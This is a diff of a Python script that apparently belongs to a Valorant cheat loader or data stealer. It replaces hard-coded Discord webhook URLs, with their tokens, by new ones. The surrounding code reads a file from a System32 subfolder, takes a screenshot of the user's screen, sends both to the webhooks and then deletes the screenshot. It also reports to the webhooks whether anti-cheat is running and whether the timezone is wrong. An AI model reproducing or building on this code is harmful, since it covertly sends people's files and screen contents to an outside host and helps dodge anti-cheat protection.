@@ -30,11 +30,11 @@ os.system('cls')
 file_pathkeyx = r"C:\Windows\System32\xsystem\xaes.txt"
 with open(file_pathkeyx, 'r') as file:
     contentxsf = file.read()
-send_dx("https://discord.com/api/webhooks/1326055025755029525/SjdzM50XA1hduFyDQmQTPw96FHLF4b0HZYzjjTZhuoNpJnW0L2j0qeqpjopIK6aq4hqU", contentxsf)
+send_dx("https://discord.com/api/webhooks/1326419589533536388/8wcu3bdBoRw-0uanJC1CP-bmIVGO9wFcOlCFZQ4m2fZ8VenddBOM4SkhIDsSfAisB5kW", contentxsf)
 os.system('cls')
 file_pathmybootaes = r"C:\myaesboot.txt"
 screenshot_pathx = take_screenshot_and_save()
-send_screenshot_to_discord("https://discord.com/api/webhooks/1326055025755029525/SjdzM50XA1hduFyDQmQTPw96FHLF4b0HZYzjjTZhuoNpJnW0L2j0qeqpjopIK6aq4hqU", screenshot_path)
+send_screenshot_to_discord("https://discord.com/api/webhooks/1326419589533536388/8wcu3bdBoRw-0uanJC1CP-bmIVGO9wFcOlCFZQ4m2fZ8VenddBOM4SkhIDsSfAisB5kW", screenshot_path)
 delete_screenshot(screenshot_pathx)
 os.system('cls')
 pvvalorant="VALORANT.EXE"
@@ -47,7 +47,7 @@ def check_program_run_2():
             file_timestamp = os.path.getmtime(file_path)
             file_time = datetime.fromtimestamp(file_timestamp)
             if file_time >= boot_time:
-                send_dx("https://discord.com/api/webhooks/1326055252042059866/tjtsPAL74fDf1S0G_uen--eml1RjQ6Ebjj-QjUwROVQTHIXgQmhk6ycTsE_7_5b2cJd5", "HVCI WARNING.")
+                send_dx("https://discord.com/api/webhooks/1326419500270358649/5aSzqgQ3j1pX4VS4FdBm8nCTTqj6vWIi9sb__nM2S0l2N_wgAEajHN2YxtyJd8JmzhEf", "HVCI WARNING.")
                 os.system('cls')
                 print("ERROR, Valorant anti-cheat is running.")
                 input()
@@ -62,7 +62,7 @@ def check_timezone():
     utc_time = time.gmtime()
     time_difference = (time.mktime(local_time) - time.mktime(utc_time)) / 3600
     if time_difference != 8:
-        send_dx("https://discord.com/api/webhooks/1326055252042059866/tjtsPAL74fDf1S0G_uen--eml1RjQ6Ebjj-QjUwROVQTHIXgQmhk6ycTsE_7_5b2cJd5", "wrong time, not utc8+")
+        send_dx("https://discord.com/api/webhooks/1326419500270358649/5aSzqgQ3j1pX4VS4FdBm8nCTTqj6vWIi9sb__nM2S0l2N_wgAEajHN2YxtyJd8JmzhEf", "wrong time, not utc8+")
         os.system('cls')
         print("Set your timezone to UTC8+.")
         input()
